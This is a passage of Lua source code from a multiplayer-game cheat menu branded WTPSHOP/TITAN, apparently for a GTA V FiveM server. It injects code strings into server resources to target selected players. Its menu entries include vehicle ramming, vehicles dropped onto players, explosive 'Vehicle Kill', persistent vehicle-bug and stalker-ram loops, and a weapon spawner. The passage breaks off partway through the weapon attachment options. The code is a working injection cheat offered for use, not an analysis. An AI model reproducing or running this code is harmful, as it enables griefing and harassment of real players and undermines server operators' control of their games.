                                                local SafeSetEntityInvincible = SafeWrap(SetEntityInvincible)
                                                local SafeSetEntityCollision = SafeWrap(SetEntityCollision)
                                                local SafeAttachEntityToEntityPhysically = SafeWrap(AttachEntityToEntityPhysically)
                                                local SafeDetachEntity = SafeWrap(DetachEntity)
                                                local SafeDeleteEntity = SafeWrap(DeleteEntity)
                                                local SafeWait = SafeWrap(Citizen.Wait)
                                                local SafeSetEntityCoords = SafeWrap(SetEntityCoords)
                                                local SafeGetHashKey = SafeWrap(GetHashKey)
                                                local SafeRequestModel = SafeWrap(RequestModel)
                                                local SafeHasModelLoaded = SafeWrap(HasModelLoaded)
                                                local SafeCVehicle = SafeWrap(CreateVehicle)
                                                local SafeGetVehiclePedIsIn = SafeWrap(GetVehiclePedIsIn)
                                                local SafeSetEntityVelocity = SafeWrap(SetEntityVelocity)
                                                local SafeSetVehicleOnGroundProperly = SafeWrap(SetVehicleOnGroundProperly)
                                                local SafeSetEntityHeading = SafeWrap(SetEntityHeading)

                                                local function loadVehicleModel(model)
                                                    local modelHash = SafeGetHashKey(model)
                                                    SafeRequestModel(modelHash)
                                                    while not SafeHasModelLoaded(modelHash) do
                                                        SafeWait(0)
                                                    end
                                                    return modelHash
                                                end

                                                SafeThread(function()
                                                    local playerPed = SafePlayerPedId()
                                                    local playerCoords = SafeGetEntityCoords(playerPed)
                                                    local targetPed = GetPlayerPed(%d)
                                                    if not SafeDoesEntityExist(targetPed) then return end

                                                    local targetVeh = SafeGetVehiclePedIsIn(targetPed, false)
                                                    if not SafeDoesEntityExist(targetVeh) then
                                                        return
                                                    end

                                                    SafeSetEntityInvincible(targetVeh, true)
                                                    SafeSetEntityCollision(targetVeh, true, true)

                                                    local rampModel = "bmx"
                                                    local rampHash = loadVehicleModel(rampModel)
                                                    local ghostVeh = SafeCVehicle(rampHash, playerCoords.x, playerCoords.y, playerCoords.z - 2.0, 0.0, true, false)
                                                    if SafeDoesEntityExist(ghostVeh) then
                                                        SafeSetEntityVisible(ghostVeh, false, 0)
                                                        SafeSetEntityInvincible(ghostVeh, true)
                                                        SafeSetEntityCollision(ghostVeh, false, false)

                                                        SafeAttachEntityToEntityPhysically(
                                                            ghostVeh,
                                                            targetVeh,
                                                            0, 0, 0,
                                                            2000.0, 1460.928, 1000.0,
                                                            10.0, 88.0, 10.0,
                                                            true, true, true, false, 0
                                                        )
                                                    end

                                                    local upwardZ = 2.0
                                                    local iterations = 25
                                                    for i = 1, iterations do
                                                        if not SafeDoesEntityExist(targetVeh) then break end
                                                        SafeSetEntityVelocity(targetVeh, 0.0, 0.0, upwardZ)
                                                        SafeWait(200)
                                                    end

                                                    SafeThread(function()
                                                        SafeWait(30000)
                                                        if SafeDoesEntityExist(targetVeh) then
                                                            SafeSetEntityInvincible(targetVeh, false)
                                                            if SafeDoesEntityExist(ghostVeh) then
                                                                SafeDetachEntity(ghostVeh, true, true)
                                                                SafeDeleteEntity(ghostVeh)
                                                            end
                                                        end
                                                    end)
                                                end)
                                            ]], player))
                                        end
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    end
                                else
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "button", label = "Vehicle Ram", desc = 'This will ram the selected player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "WTPSHOP", "There was an error while trying to ram that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTPSHOP:UpdateListMenu()
                                        return
                                    end

                                    executeCode(targetRes, string.format([[
                                        local playerId = GetPlayerFromServerId(%d)
                                        if playerId and playerId ~= -1 then
                                            local targetPed = GetPlayerPed(playerId)
                                            if DoesEntityExist(targetPed) then
                                                local targetCoords = GetEntityCoords(targetPed)
                                                local model = GetHashKey("sultan")
                                                RequestModel(model)
                                                while not HasModelLoaded(model) do
                                                    Wait(0)
                                                end
                                                local spawnCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, -15.0, 0.0)
                                                local veh = CreateVehicle(model, spawnCoords.x, spawnCoords.y, spawnCoords.z, 0.0, true, false)
                                                SetEntityVisible(veh, true, true)
                                                SetVehicleEngineOn(veh, true, true, false)
                                                SetVehicleForwardSpeed(veh, 0.0)
                                                local heading = GetHeadingFromVector_2d(targetCoords.x - spawnCoords.x,targetCoords.y - spawnCoords.y)
                                                SetEntityHeading(veh, heading)
                                                Wait(200)
                                                SetVehicleForwardSpeed(veh, 80.0)
                                                SetVehicleEnginePowerMultiplier(veh, 100.0)
                                                SetVehicleEngineTorqueMultiplier(veh, 3.0)
                                                Wait(2000)
                                                DeleteEntity(veh)
                                            end
                                        end
                                    ]], targetPlayer))
                                    self:Notify("success", "WTPSHOP", ("Vehicle ram launched at player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Spam Vehicle",
                            desc = "Spam Vehicle target random.",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    executeCode(targetRes, string.format([[
                                        local sid = %d
                                        local models = {"jugular", "sunrise1", "sultan", "neon"}
                                        
                                        WTPSHOP.Thread(function()
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(sid))
                                            if not DoesEntityExist(targetPed) then return end

                                            for i = 1, 5 do
                                                local model = models[math.random(#models)]
                                                local hash = GetHashKey(model)

                                                RequestModel(hash)
                                                while not HasModelLoaded(hash) do Wait(0) end

                                                local coords = GetEntityCoords(targetPed)
                                                local velocity = GetEntityVelocity(targetPed)
                                                
                                                local pX = coords.x + (velocity.x * 0.3)
                                                local pY = coords.y + (velocity.y * 0.3)
                                                local veh = CreateVehicle(hash, pX, pY, coords.z + 40.0, 0.0, true, true)
                                                
                                                if DoesEntityExist(veh) then
                                                    SetEntityAsMissionEntity(veh, true, true)
                                                    NetworkRegisterEntityAsNetworked(veh)
                                                    SetEntityRotation(veh, -90.0, 0.0, 0.0, 2, true)
                                                    SetEntityVelocity(veh, 0.0, 0.0, -150.0)
                                                    ApplyForceToEntity(veh, 0, 0.0, 0.0, -4000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)

                                                    WTPSHOP.Thread(function()
                                                        local spawnTime = GetGameTimer()
                                                        while DoesEntityExist(veh) do
                                                            Wait(50)
                                                            local speed = GetEntitySpeed(veh)
                                                            local age = GetGameTimer() - spawnTime
                                                            
                                                            if speed < 2.0 or age > 2000 then
                                                                Wait(200)
                                                                if DoesEntityExist(veh) then
                                                                    SetEntityCoords(veh, 0.0, 0.0, -100.0)
                                                                    DeleteEntity(veh)
                                                                end
                                                                break
                                                            end
                                                        end
                                                    end)
                                                end
                                                Wait(250)
                                            end
                                            SetModelAsNoLongerNeeded(hash)
                                        end)
                                    ]], targetPlayer))

                                    self:Notify("success", "WTPSHOP", "Launching 15 kinetic rounds with auto-cleanup!", 3000)
                                else
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "scrollable", label = "Glitch Vehicle", scrollType = "onEnter", value = 1, values = {"jugular", "pounder", "sunrise1", "sultan", "neon"}, desc = 'This will glitch the selected player',
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "WTPSHOP", "There was an error while trying to ram that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTPSHOP:UpdateListMenu()
                                        return
                                    end

                                    executeCode(targetRes, string.format([[
                                        local targetServerId = %d
                                        local targetPlayer = GetPlayerFromServerId(targetServerId)
                                        if targetPlayer == -1 then return end
                                        
                                        local targetPed = GetPlayerPed(targetPlayer)
                                        if not DoesEntityExist(targetPed) then return end
                                        
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local vehicleModel = joaat("%s")
                                        
                                        RequestModel(vehicleModel)
                                        while not HasModelLoaded(vehicleModel) do Wait(0) end
                                        
                                        local obj = CreateObject(vehicleModel, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                        if not DoesEntityExist(obj) then return end
                                        NetworkRegisterEntityAsNetworked(obj)
                                        local netId = VehToNet(obj)
                                        SetNetworkIdExistsOnAllMachines(netId, true)
                                        SetNetworkIdCanMigrate(netId, true)
                                        Wait(500)
                                        AttachEntityToEntity(obj, targetPed, GetPedBoneIndex(targetPed, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
                                        SetModelAsNoLongerNeeded(vehicleModel)
                                    ]], targetPlayer, value))
                                    self:Notify("success", "WTPSHOP", ("Glitch vehicle at player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Vehicle Airdrop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"jugular", "sunrise1", "sultan", "neon"},
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    executeCode(targetRes, string.format([[
                                        local sid = %d
                                        local modelName = "%s"
                                        local hash = GetHashKey(modelName)

                                        WTPSHOP.Thread(function()
                                            local pIdx = GetPlayerFromServerId(sid)
                                            local targetPed = GetPlayerPed(pIdx)
                                            if not DoesEntityExist(targetPed) then return end

                                            RequestModel(hash)
                                            while not HasModelLoaded(hash) do Wait(0) end

                                            local currentPos = GetEntityCoords(targetPed)
                                            local velocity = GetEntityVelocity(targetPed)
                                            local predictX = currentPos.x + (velocity.x * 0.4)
                                            local predictY = currentPos.y + (velocity.y * 0.4)
                                            local predictZ = currentPos.z + (velocity.z * 0.4)
                                            local veh = CreateVehicle(hash, predictX, predictY, predictZ + 45.0, 0.0, true, true)
                                            
                                            if DoesEntityExist(veh) then
                                                local netId = NetworkGetNetworkIdFromEntity(veh)
                                                SetNetworkIdCanMigrate(netId, true)
                                                SetEntityAsMissionEntity(veh, true, true)
                                                NetworkRegisterEntityAsNetworked(veh)
                                                SetEntityRotation(veh, -90.0, 0.0, 0.0, 2, true)
                                                SetEntityVelocity(veh, 0.0, 0.0, -180.0) 
                                                ApplyForceToEntity(veh, 0, 0.0, 0.0, -3000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)

                                                WTPSHOP.Thread(function()
                                                    local timer = GetGameTimer()
                                                    while DoesEntityExist(veh) do
                                                        Wait(100)
                                                        local speed = GetEntitySpeed(veh)
                                                        if speed < 5.0 or (GetGameTimer() - timer) > 3000 then 
                                                            Wait(2000)
                                                            if DoesEntityExist(veh) then
                                                                DeleteEntity(veh)
                                                            end
                                                            break
                                                        end
                                                    end
                                                end)
                                            end
                                            SetModelAsNoLongerNeeded(hash)
                                        end)
                                    ]], targetPlayer, value))
                                    self:Notify("success", "WTPSHOP", ("Vehicle airdrop at player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Vehicle Kill",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "vestra", "frogger2", "maverick", "buzzard", "cargobob", "t20", "comet",
                                "zentorno", "tampa", "nightshark", "kuruma", "buffalo", "massacro",
                                "ferrari", "comet2", "issi2", "vindicator", "baller", "baller2"
                            },
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "WTPSHOP", "There was an error while trying to drop vehicle to player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTPSHOP:UpdateListMenu()
                                        return
                                    end

                                    MachoInjectResource2(0, targetRes, string.format([[
                                        WTPSHOP.Thread(function()
                                            local targetId = %d
                                            local modelName = "%s"
                                            local function SpawnAndCrashAtTarget(targetId)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then
                                                    return
                                                end
                                                local targetPed = GetPlayerPed(targetPlayer)
                                                if not targetPed or targetPed == 0 then
                                                    return
                                                end
                                                local modelHash = GetHashKey(modelName)
                                                RequestModel(modelHash)
                                                local startWait = GetGameTimer()
                                                while not HasModelLoaded(modelHash) do
                                                    Citizen.Wait(10)
                                                    if GetGameTimer() - startWait > 5000 then
                                                        return
                                                    end
                                                end
                                                local headCoords = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.3)
                                                local spawnCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 10.0)
                                                local heading = GetEntityHeading(targetPed)
                                                local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                                                if veh == 0 then
                                                    SetModelAsNoLongerNeeded(modelHash)
                                                    return
                                                end
                                                SetEntityVisible(veh, false, 0)
                                                SetEntityInvincible(veh, false)
                                                SetVehicleDoorsLocked(veh, 1)
                                                SetEntityAsMissionEntity(veh, true, true)
                                                SetEntityVelocity(veh, 0.0, 0.0, -10.0)
                                                WTPSHOP.Thread(function()
                                                    while true do
                                                        Citizen.Wait(100)
                                                        if IsEntityOnGround(veh) then
                                                            AddExplosion(GetEntityCoords(veh).x, GetEntityCoords(veh).y, GetEntityCoords(veh).z, 2, 10.0, true, false, 1.0)
                                                            DeleteEntity(veh)
                                                            break
                                                        end
                                                    end
                                                end)
                                                SetModelAsNoLongerNeeded(modelHash)
                                            end
                                            SpawnAndCrashAtTarget(targetId)
                                            Citizen.Wait(5000)
                                            SpawnAndCrashAtTarget(targetId)
                                        end)
                                    ]], targetPlayer, value))
                                    self:Notify("success", "WTPSHOP", ("You executed vehicle kill to player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Troll Toggles" },
                        {
                            type = "checkbox",
                            label = "Bug Player Vehicle",
                            desc = "Bug player vehicle via target.",
                            checked = false,
                            onSelect = function(checked)
                                local targetId = nil
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then
                                        targetId = tonumber(serverId)
                                        break
                                    end
                                end

                                if not targetId then
                                    self:Notify("error", "TITAN", "You must select a player to do this!", 3000)
                                    return
                                end

                                if checked then
                                    ApiRasclat.SafeRes(string.format([[
                                        _G.VehBugActive = true
                                        _G.VehBugObjs = {}

                                        local targetSid = %d
                                        local model = joaat("xs_propintarena_speakers_01a")

                                        WTPSHOP.Native(RequestModel, model)
                                        while not WTPSHOP.Native(HasModelLoaded, model) do WTPSHOP.Wait(0) end

                                        WTPSHOP.Thread(function()
                                            local rot = 0
                                            while _G.VehBugActive do
                                                local pId = WTPSHOP.Native(GetPlayerFromServerId, targetSid)
                                                local targetPed = WTPSHOP.Native(GetPlayerPed, pId)
                                                local veh = WTPSHOP.Native(GetVehiclePedIsIn, targetPed, false)
                                                
                                                if veh ~= 0 then
                                                    if #_G.VehBugObjs < 4 then
                                                        local offsets = {
                                                            vector3(2.0, 0, 0), vector3(-2.0, 0, 0),
                                                            vector3(0, 2.0, 0), vector3(0, -2.0, 0)
                                                        }
                                                        for _, off in ipairs(offsets) do
                                                            local obj = CreateObject(model, GetEntityCoords(veh), true, true, false)
                                                            SetEntityVisible(obj, false, false)
                                                            SetEntityCollision(obj, true, true)
                                                            table.insert(_G.VehBugObjs, {ent = obj, off = off})
                                                        end
                                                    end

                                                    rot = (rot + 120) %% 360
                                                    for _, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then
                                                            local worldPos = GetOffsetFromEntityInWorldCoords(veh, data.off.x, data.off.y, 0.0)
                                                            SetEntityCoordsNoOffset(data.ent, worldPos.x, worldPos.y, worldPos.z, false, false, false)
                                                            SetEntityRotation(data.ent, rot, rot, rot, 2, true)
                                                            ApplyForceToEntity(veh, 1, 0.0, 0.0, 2.5, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                        end
                                                    end
                                                else
                                                    for i, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                                    end
                                                    _G.VehBugObjs = {}
                                                end
                                                Wait(0)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "WTPSHOP", ("Vehicle Bug to player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    ApiRasclat.SafeRes([[
                                        _G.VehBugActive = false
                                        if _G.VehBugObjs then
                                            for _, data in ipairs(_G.VehBugObjs) do
                                                if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                            end
                                        end
                                        _G.VehBugObjs = nil
                                    ]])
                                    self:Notify("info", "TITAN", "Vehicle Bug Remove", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Bug Player Vehicle V2",
                            desc = "Driver in a bouncing, uncontrollable wreck.",
                            checked = false,
                            onSelect = function(checked)
                                local targetId = nil
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then
                                        targetId = tonumber(serverId)
                                        break
                                    end
                                end

                                if not targetId then
                                    self:Notify("error", "TITAN", "You must select a player to do this!", 3000)
                                    return
                                end

                                if checked then
                                    ApiRasclat.SafeRes(string.format([[
                                        _G.VehBugActive = true
                                        _G.VehBugObjs = {}

                                        local targetSid = %d
                                        local model = joaat("xs_propintarena_speakers_01a")

                                        WTPSHOP.Native(RequestModel, model)
                                        while not WTPSHOP.Native(HasModelLoaded, model) do WTPSHOP.Wait(0) end

                                        WTPSHOP.Thread(function()
                                            local rot = 0
                                            while _G.VehBugActive do
                                                local pId = WTPSHOP.Native(GetPlayerFromServerId, targetSid)
                                                local targetPed = WTPSHOP.Native(GetPlayerPed, pId)
                                                local veh = WTPSHOP.Native(GetVehiclePedIsIn, targetPed, false)
                                                
                                                if veh ~= 0 then
                                                    for i = 0, 7 do
                                                        if not IsVehicleTyreBurst(veh, i, true) then
                                                            SetVehicleTyreBurst(veh, i, true, 1000.0)
                                                        end
                                                    end

                                                    if #_G.VehBugObjs < 4 then
                                                        local offsets = {
                                                            vector3(2.0, 0, 0), vector3(-2.0, 0, 0),
                                                            vector3(0, 2.0, 0), vector3(0, -2.0, 0)
                                                        }
                                                        for _, off in ipairs(offsets) do
                                                            local obj = CreateObject(model, GetEntityCoords(veh), true, true, false)
                                                            SetEntityVisible(obj, false, false)
                                                            SetEntityCollision(obj, true, true)
                                                            table.insert(_G.VehBugObjs, {ent = obj, off = off})
                                                        end
                                                    end

                                                    rot = (rot + 120) %% 360
                                                    for _, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then
                                                            local worldPos = GetOffsetFromEntityInWorldCoords(veh, data.off.x, data.off.y, 0.0)
                                                            SetEntityCoordsNoOffset(data.ent, worldPos.x, worldPos.y, worldPos.z, false, false, false)
                                                            SetEntityRotation(data.ent, rot, rot, rot, 2, true)
                                                            ApplyForceToEntity(veh, 1, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                        end
                                                    end
                                                else
                                                    for i, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                                    end
                                                    _G.VehBugObjs = {}
                                                end
                                                Wait(0)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "WTPSHOP", ("Vehicle Bug V2 to player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    ApiRasclat.SafeRes([[
                                        _G.VehBugActive = false
                                        if _G.VehBugObjs then
                                            for _, data in ipairs(_G.VehBugObjs) do
                                                if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                            end
                                        end
                                        _G.VehBugObjs = nil
                                    ]])
                                    self:Notify("info", "TITAN", "Vehicle Bug Removed", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Stalker Ram Loop",
                            checked = false,
                            desc = "One persistent vehicle that glued-rams the target constantly.",
                            onSelect = function(checked)
                                if checked then
                                    local targetPlayer = nil
                                    for serverId, isChecked in pairs(CPlayers) do
                                        if isChecked then targetPlayer = serverId break end
                                    end

                                    if targetPlayer then
                                        _G.StalkerLoopActive = true
                                        executeCode(targetRes, string.format([[
                                            local targetId = %d
                                            _G.StalkerLoopActive = true

                                            WTPSHOP.Thread(function()
                                                local model = WTPSHOP.Native(GetHashKey, "sultan")
                                                WTPSHOP.Native(RequestModel, model)
                                                while not WTPSHOP.Native(HasModelLoaded, model) do WTPSHOP.Wait(0) end

                                                local stalkerVeh = nil

                                                while _G.StalkerLoopActive do
                                                    WTPSHOP.Wait(0)
                                                    
                                                    local player = WTPSHOP.Native(GetPlayerFromServerId, targetId)
                                                    if player ~= -1 then
                                                        local targetPed = WTPSHOP.Native(GetPlayerPed, player)
                                                        
                                                        if WTPSHOP.Native(DoesEntityExist, targetPed) then
                                                            if not stalkerVeh or not WTPSHOP.Native(DoesEntityExist, stalkerVeh) then
                                                                local spawnPos = WTPSHOP.Native(GetEntityCoords, targetPed)
                                                                stalkerVeh = WTPSHOP.Native(CreateVehicle, model, spawnPos.x, spawnPos.y, spawnPos.z - 5.0, 0.0, true, true)
                                                                WTPSHOP.Native(NetworkRegisterEntityAsNetworked, stalkerVeh)
                                                                local netId1 = WTPSHOP.Native(NetworkGetNetworkIdFromEntity, stalkerVeh)
                                                                WTPSHOP.Native(SetNetworkIdCanMigrate, netId1, false)
                                                                WTPSHOP.Native(NetworkSetEntityVisibleToNetwork, stalkerVeh, true)
                                                                WTPSHOP.Native(SetEntityInvincible, stalkerVeh, true)
                                                                WTPSHOP.Native(SetEntityAlpha, stalkerVeh, 200, false)
                                                            end

                                                            local playerPos = WTPSHOP.Native(GetEntityCoords, targetPed)
                                                            local behindPos = WTPSHOP.Native(GetOffsetFromEntityInWorldCoords, targetPed, 0.0, -1.0, 0.1)
                                                            
                                                            local dist = #(playerPos - WTPSHOP.Native(GetEntityCoords, stalkerVeh))
                                                            if dist > 2.0 then
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, stalkerVeh, behindPos.x, behindPos.y, behindPos.z, false, false, false)
                                                                WTPSHOP.Native(SetEntityHeading, stalkerVeh, WTPSHOP.Native(GetEntityHeading, targetPed))
                                                            end

                                                            WTPSHOP.Native(NetworkRequestControlOfEntity, stalkerVeh)
                                                            WTPSHOP.Native(SetVehicleForwardSpeed, stalkerVeh, 150.0) 
                                                        else
                                                            _G.StalkerLoopActive = false
                                                        end
                                                    else
                                                        WTPSHOP.Wait(500)
                                                    end
                                                end

                                                if WTPSHOP.Native(DoesEntityExist, stalkerVeh) then WTPSHOP.Native(DeleteEntity, stalkerVeh) end
                                            end)
                                        ]], targetPlayer))

                                        self:Notify("success", "WTPSHOP", "Stalker Ram Loop Started!", 3000)
                                    else
                                        self:Notify("error", "WTPSHOP", "Select a player first!", 3000)
                                    end
                                else
                                    executeCode(targetRes, "_G.StalkerLoopActive = false")
                                    self:Notify("info", "WTPSHOP", "Stalker Ram Loop Stopped", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Black Hole",
                            checked = false,
                            desc = 'Attracts all nearby vehicles to the selected player.',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, isChecked in pairs(CPlayers) do
                                    if isChecked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if checked and not targetPlayer then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return false
                                end

                                self:ToggleBlackHole(checked, targetPlayer)
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "ph-bold ph-rocket-launch",
            label = "Weapon Options",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "button", label = "Give Weapon",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "WEAPON_", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedWeapon(val)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Clear Weapons",
                            onSelect = function()
                                    ApiRasclat.SafeRes([[
                                    local selfPed = WTPSHOP.Native(PlayerPedId)
                                    WTPSHOP.Native(RemoveAllPedWeapons, selfPed, true)
                                    WTPSHOP.Native(GiveWeaponToPed, selfPed, 'weapon_unarmed', false, true)
                                ]])
                            end
                        },
                        { type = "divider", label = "All Weapons" },
                        { type = "scrollable", label = "Melee", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle", "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete", "weapon_switchblade", "weapon_nightstick", "weapon_wrench" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Handguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol", "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol", "weapon_vintagepistol", "weapon_flaregun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "SMGs", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg", "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Rifles", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle", "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine", "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle", "weapon_bullpuprifle_mk2", "weapon_marksmanrifle" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Shotguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun", "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun", "weapon_autoshotgun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Snipers", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2", "weapon_marksmanrifle", "weapon_marksmanrifle_mk2" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Explosives", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb", "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_rpg", "weapon_minigun", "weapon_firework" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Heavy", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_mg", "weapon_combatmg", "weapon_gusenberg", "weapon_minigun", "weapon_grenadelauncher", "weapon_railgun", "weapon_hominglauncher", "weapon_compactlauncher" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Throwables", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        }
                    }
                },
                {
                    label = "Combat",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Suppressor", "Magazine", "Flashlight", "Scopes", "Grip"}, label = "Attachments",
                            onSelect = function(value)
                                if value == "Suppressor" then
                                    ApiRasclat.ExecuteFeature("weapons", [[
                                        local ped = WTPSHOP.Native(PlayerPedId)
                                        local currentWep = WTPSHOP.Native(GetSelectedPedWeapon, ped)
                                        local components = {0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E, 0xC6654D78, 0x448892A, 0x3CC6BD52}
                                        for _, comp in ipairs(components) do 
